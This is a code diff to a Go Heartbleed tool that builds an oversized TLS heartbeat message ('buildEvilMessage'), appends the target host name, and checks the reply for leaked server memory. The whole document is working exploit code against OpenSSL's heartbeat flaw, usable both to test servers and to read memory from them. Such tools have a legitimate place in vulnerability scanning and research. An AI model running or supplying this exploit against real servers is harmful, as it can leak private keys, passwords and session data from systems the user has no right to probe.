@@ -19,7 +19,7 @@ type Target struct {
 var Safe = errors.New("heartbleed: no response or payload not found")
 var Timeout = errors.New("heartbleed: timeout")
 
-var padding = []byte("YELLOW SUBMARINE")
+var padding = []byte(" YELLOW SUBMARINE ")
 
 // struct {
 //    uint8  type;
@@ -27,13 +27,13 @@ var padding = []byte("YELLOW SUBMARINE")
 //    opaque payload[HeartbeatMessage.payload_length];
 //    opaque padding[padding_length];
 // } HeartbeatMessage;
-func buildEvilMessage(payload []byte) []byte {
+func buildEvilMessage(payload []byte, host string) []byte {
 	buf := bytes.Buffer{}
 	err := binary.Write(&buf, binary.BigEndian, uint8(1))
 	if err != nil {
 		panic(err)
 	}
-	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
+	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+40+len(host)))
 	if err != nil {
 		panic(err)
 	}
@@ -45,18 +45,11 @@ func buildEvilMessage(payload []byte) []byte {
 	if err != nil {
 		panic(err)
 	}
-	return buf.Bytes()
-}
-
-func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]byte) {
-	return func(data []byte) {
-		spew.Fdump(buf, data)
-		if bytes.Index(data, padding) == -1 {
-			vuln <- false
-		} else {
-			vuln <- true
-		}
+	_, err = buf.WriteString(host)
+	if err != nil {
+		panic(err)
 	}
+	return buf.Bytes()
 }
 
 func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (out []byte, err error) {
@@ -87,7 +80,19 @@ func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (out []byte, err e
 
 	var vuln = make(chan bool, 1)
 	buf := new(bytes.Buffer)
-	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, buf, vuln))
+	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, host)), func(data []byte) {
+		spew.Fdump(buf, data)
+		if bytes.Index(data, padding) == -1 {
+			vuln <- false
+		} else {
+			if strings.Index(string(data), host) == -1 {
+				err = errors.New("Please try again")
+				vuln <- false
+			} else {
+				vuln <- true
+			}
+		}
+	})
 	if err != nil {
 		return
 	}
@@ -95,6 +100,7 @@ func Heartbleed(tgt *Target, payload []byte, skipVerify bool) (out []byte, err e
 	go func() {
 		// Needed to process the incoming heartbeat
 		conn.Read(nil)
+		// spew.Dump(read_err)
 	}()
 
 	go func() {
